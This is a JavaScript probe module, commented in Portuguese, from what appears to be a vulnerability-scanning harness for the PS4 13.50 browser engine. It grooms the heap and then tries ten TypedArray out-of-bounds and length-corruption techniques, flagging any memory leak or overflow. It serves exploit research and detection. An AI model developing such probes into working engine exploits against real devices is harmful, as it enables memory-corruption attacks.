/**
 * TEST: TypedArray Out-of-Bounds via length corruption
 * CORRIGIDO: Falsos positivos eliminados, probes retornam valores comparáveis
 * PS4 13.50: TypedArrays disponíveis, alvo principal de exploits JSC
 */

export const testTypedarrayOob = {
    id: 'TYPEDARRAY_OOB',
    name: 'TypedArray OOB Access',
    risk: 'CRITICAL',
    category: 'TYPES',
    description: 'Tenta corromper .length de TypedArray para leitura/escrita OOB',
    ps4Compatible: true,
    
    setup: function() {
        this.ARRAY_SIZE = 16;
        this.GROOM_COUNT = 200;
        this.SECRET_MARKER = 0x5EC10000;
        
        // Arrays que tentaremos corromper
        this.targetArray = new Uint32Array(this.ARRAY_SIZE);
        this.targetArray.fill(0xAAAAAAAA);
        
        // Array espião (para detectar vazamento)
        this.spyArray = new Uint32Array(this.ARRAY_SIZE);
        this.spyArray.fill(0xBBBBBBBB);
        
        // Array com dados sensíveis simulados
        this.secretArray = new Uint32Array(this.ARRAY_SIZE);
        for (let i = 0; i < this.ARRAY_SIZE; i++) {
            this.secretArray[i] = this.SECRET_MARKER + i;
        }
        this.secretArray[0] = this.SECRET_MARKER;
        
        // Grooming: cria muitos arrays para heap feng shui
        this.groomArrays = [];
        for (let i = 0; i < this.GROOM_COUNT; i++) {
            const arr = new Float64Array(this.ARRAY_SIZE);
            arr.fill(i * 1.5);
            this.groomArrays.push(arr);
        }
        
        // Armazena referência fraca
        this.weakTarget = typeof WeakRef !== 'undefined' ? 
            new WeakRef(this.targetArray) : null;
            
        // Flags para validação
        this.oobView = null;
        this.oobData = undefined;
        this.bigViewData = null;
        this.dvReads = null;
        this.definePropError = null;
        this.setError = null;
        this.copyError = null;
        this.subarrayError = null;
        this.sliceError = null;
        this.dvError = null;
        this.oobViewError = null;
        this.bigViewError = null;
        this.subarrayResult = null;
        this.setResult = null;
        this.lengthCorrupted = false;
    },
    
    probe: [
        // Probe 0: Length do target array (CORRIGIDO: retorna 0 ou length real)
        function(scenario) {
            try {
                const len = scenario.targetArray?.length ?? -1;
                // Se length NÃO é o original (16), retorna o valor real
                // Se é 16 (normal), retorna 0 para baseline consistente
                if (len === 16) return 0;
                scenario.lengthCorrupted = true;
                return len;
            } catch (e) {
                return -1;
            }
        },
        
        // Probe 1: ByteLength do buffer subjacente
        function(scenario) {
            return scenario.targetArray?.buffer?.byteLength ?? -1;
        },
        
        // Probe 2: Valor na posição 0 (deveria ser 0xAAAAAAAA)
        function(scenario) {
            try {
                return scenario.targetArray[0] ?? -1;
            } catch (e) {
                return -1;
            }
        },
        
        // Probe 3: Acesso OOB (posição length - deveria ser undefined)
        function(scenario) {
            try {
                const len = scenario.targetArray?.length ?? 0;
                const val = scenario.targetArray[len];
                // Retorna 1 se conseguiu acessar (OOB), 0 se undefined (normal)
                return val !== undefined ? 1 : 0;
            } catch (e) {
                return -1;
            }
        },
        
        // Probe 4: Spy array integridade (0xBBBBBBBB = normal)
        function(scenario) {
            try {
                return scenario.spyArray[0] ?? -1;
            } catch (e) {
                return -1;
            }
        }
    ],
    
    trigger: function() {
        // Ataque 1: Tenta modificar length via defineProperty
        try {
            Object.defineProperty(this.targetArray, 'length', {
                value: 1000000,
                writable: true,
                configurable: true
            });
            // Verifica se realmente funcionou
            if (this.targetArray.length === 1000000) {
                this.lengthCorrupted = true;
            }
        } catch (e) {
            this.definePropError = e.message;
        }
        
        // Ataque 2: Tenta setar length diretamente
        try {
            this.targetArray.length = 1000000;
            if (this.targetArray.length === 1000000) {
                this.lengthCorrupted = true;
            }
        } catch (e) {
            // Esperado falhar em TypedArrays (length é readonly)
        }
        
        // Ataque 3: Cria view com offset malicioso (negativo)
        try {
            const buffer = this.targetArray.buffer;
            // Tenta criar view começando ANTES do buffer
            const oobView = new Uint32Array(buffer, -4, 100);
            this.oobView = oobView;
            this.oobData = oobView[0]; // Leitura antes do buffer!
        } catch (e) {
            this.oobViewError = e.message;
        }
        
        // Ataque 4: View com length maior que o buffer
        try {
            const buffer = this.targetArray.buffer;
            const bigView = new Uint32Array(buffer, 0, 1000000);
            // Se chegou aqui, conseguiu criar view gigante!
            this.bigViewData = [];
            const maxRead = Math.min(this.ARRAY_SIZE + 20, 1000000);
            for (let i = this.ARRAY_SIZE; i < maxRead; i++) {
                try {
                    const val = bigView[i];
                    this.bigViewData.push({
                        index: i,
                        value: val,
                        hex: '0x' + (val?.toString(16) ?? 'undefined')
                    });
                } catch (e) {
                    this.bigViewData.push({ index: i, error: e.message });
                    break;
                }
            }
        } catch (e) {
            this.bigViewError = e.message;
        }
        
        // Ataque 5: DataView com offsets inválidos
        try {
            const dv = new DataView(this.targetArray.buffer);
            this.dvReads = [];
            
            const testOffsets = [-8, -4, 0, 4, 8, 
                                this.targetArray.byteLength - 8,
                                this.targetArray.byteLength,
                                this.targetArray.byteLength + 4];
            
            for (const offset of testOffsets) {
                try {
                    const value = dv.getFloat64(offset, true);
                    this.dvReads.push({ offset, value, error: null });
                } catch (e) {
                    this.dvReads.push({ offset, value: null, error: e.message });
                }
            }
        } catch (e) {
            this.dvError = e.message;
        }
        
        // Ataque 6: copyWithin com índices além dos limites
        try {
            this.targetArray.copyWithin(0, this.ARRAY_SIZE, this.ARRAY_SIZE + 10);
        } catch (e) {
            this.copyError = e.message;
        }
        
        // Ataque 7: subarray com índices negativos
        try {
            const sub = this.targetArray.subarray(-10, 100);
            if (sub && sub.length > 0) {
                this.subarrayResult = { 
                    length: sub.length, 
                    firstVal: sub[0],
                    firstHex: '0x' + (sub[0]?.toString(16) ?? 'undefined')
                };
            }
        } catch (e) {
            this.subarrayError = e.message;
        }
        
        // Ataque 8: set() com array maior que o target
        try {
            const bigSource = new Uint32Array(1000);
            bigSource.fill(0x13371337);
            this.targetArray.set(bigSource);
            this.setResult = 'SET_SUCCESS_WITH_OVERFLOW';
        } catch (e) {
            this.setError = e.message;
        }
        
        // Ataque 9: slice para criar cópia e verificar boundary
        try {
            const sliced = this.targetArray.slice(0, this.ARRAY_SIZE + 10);
            if (sliced && sliced.length > this.ARRAY_SIZE) {
                this.sliceResult = {
                    requested: this.ARRAY_SIZE + 10,
                    actual: sliced.length,
                    extraData: Array.from(sliced.slice(this.ARRAY_SIZE))
                };
            }
        } catch (e) {
            this.sliceError = e.message;
        }
        
        // Ataque 10: Cria Float64Array sobre mesmo buffer e lê como double
        try {
            const floatView = new Float64Array(this.targetArray.buffer);
            this.floatLeak = [];
            for (let i = 0; i < Math.min(floatView.length, 10); i++) {
                const val = floatView[i];
                this.floatLeak.push({
                    index: i,
                    value: val,
                    isPointer: Math.abs(val) > 100000 && Math.abs(val) < 0x7FFFFFFFFFFF,
                    hex: val.toString(16)
                });
            }
        } catch (e) {
            this.floatError = e.message;
        }
        
        // Força GC após ataques
        if (typeof gc === 'function') {
            gc();
            gc();
        }
    },
    
    cleanup: function() {
        this.targetArray = null;
        this.spyArray = null;
        this.secretArray = null;
        this.groomArrays = null;
        this.oobView = null;
        this.bigViewData = null;
        this.dvReads = null;
        this.weakTarget = null;
        this.floatLeak = null;
    },
    
    customValidator: function(baseResults, afterResults) {
        // 1. Verifica se length foi REALMENTE corrompido
        if (afterResults[0] !== 0 && afterResults[0] !== -1) {
            return {
                anomaly: true,
                reason: `💥 LENGTH CORRUPTION REAL: length do TypedArray alterado de 16 para ${afterResults[0]}! (defineProperty/bypass confirmado)`
            };
        }
        
        // 2. Verifica OOB view com offset negativo (CRÍTICO)
        if (this.oobView && this.oobData !== undefined) {
            return {
                anomaly: true,
                reason: `💥 OOB VIEW: View com offset negativo criada! Leitura antes do buffer: 0x${this.oobData?.toString(16)}`
            };
        }
        
        // 3. Verifica view com length > buffer (bypass de validação)
        if (this.bigViewData && this.bigViewData.length > 0) {
            const validReads = this.bigViewData.filter(r => !r.error);
            if (validReads.length > 0) {
                const first = validReads[0];
                return {
                    anomaly: true,
                    reason: `💥 LENGTH BYPASS: View criada com length maior que buffer. ${validReads.length} leituras OOB. Primeiro: index=${first.index}, valor=${first.hex}`
                };
            }
        }
        
        // 4. DataView OOB (offsets negativos ou além do buffer)
        if (this.dvReads) {
            const negativeReads = this.dvReads.filter(r => r.offset < 0 && !r.error);
            const beyondReads = this.dvReads.filter(r => r.offset >= this.targetArray?.buffer?.byteLength && !r.error);
            
            if (negativeReads.length > 0) {
                return {
                    anomaly: true,
                    reason: `💥 DATAVIEW NEGATIVE: ${negativeReads.length} leituras DataView com offset negativo! offset=${negativeReads[0].offset}, valor=${negativeReads[0].value}`
                };
            }
            
            if (beyondReads.length > 0) {
                return {
                    anomaly: true,
                    reason: `🏆 DATAVIEW OOB: ${beyondReads.length} leituras além do buffer! offset=${beyondReads[0].offset}`
                };
            }
        }
        
        // 5. set() com overflow (escrita OOB)
        if (this.setResult === 'SET_SUCCESS_WITH_OVERFLOW') {
            return {
                anomaly: true,
                reason: `💥 SET OVERFLOW: set() com array de 1000 elementos em buffer de 64 bytes NÃO lançou erro! Escrita OOB massiva!`
            };
        }
        
        // 6. subarray com índices negativos
        if (this.subarrayResult && this.subarrayResult.length > 0) {
            return {
                anomaly: true,
                reason: `🏆 SUBARRAY NEGATIVE: subarray(-10, 100) criou view de length=${this.subarrayResult.length}. Primeiro valor: ${this.subarrayResult.firstHex}`
            };
        }
        
        // 7. slice que retornou mais dados que o esperado
        if (this.sliceResult && this.sliceResult.actual > this.ARRAY_SIZE) {
            return {
                anomaly: true,
                reason: `💥 SLICE OOB: slice(0, ${this.sliceResult.requested}) retornou ${this.sliceResult.actual} elementos! Dados extras: ${JSON.stringify(this.sliceResult.extraData)}`
            };
        }
        
        // 8. Float64 leak detection (possíveis ponteiros)
        if (this.floatLeak) {
            const pointers = this.floatLeak.filter(f => f.isPointer);
            if (pointers.length > 0) {
                return {
                    anomaly: true,
                    reason: `💥 FLOAT64 POINTER LEAK: ${pointers.length} possíveis ponteiros vazados via Float64Array! Primeiro: ${pointers[0].hex}`
                };
            }
        }
        
        // 9. Spy array corrompido (overflow atingiu array vizinho)
        if (afterResults[4] !== 0xBBBBBBBB && afterResults[4] !== -1) {
            const spyVal = afterResults[4];
            return {
                anomaly: true,
                reason: `💥 SPY CORRUPTION: Array espião corrompido! Era 0xBBBBBBBB, agora é 0x${spyVal?.toString(16)} — Overflow para array adjacente!`
            };
        }
        
        return { anomaly: false, reason: '' };
    }
};
